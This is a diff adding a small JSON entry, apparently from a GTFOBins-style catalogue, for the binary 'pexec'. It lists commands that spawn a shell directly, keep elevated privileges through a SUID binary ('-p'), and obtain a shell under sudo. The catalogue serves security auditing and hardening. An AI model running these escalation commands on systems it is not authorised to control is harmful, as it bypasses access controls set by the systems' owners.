@@ -1,0 +1,22 @@
+{
+  "functions": {
+    "shell": [
+      {
+        
+        "code": "pexec /bin/sh\n"
+      }
+    ],
+    "suid": [
+      {
+        
+        "code": "./pexec /bin/sh -p\n"
+      }
+    ],
+    "sudo": [
+      {
+        
+        "code": "sudo pexec /bin/sh\n"
+      }
+    ]
+  }
+}
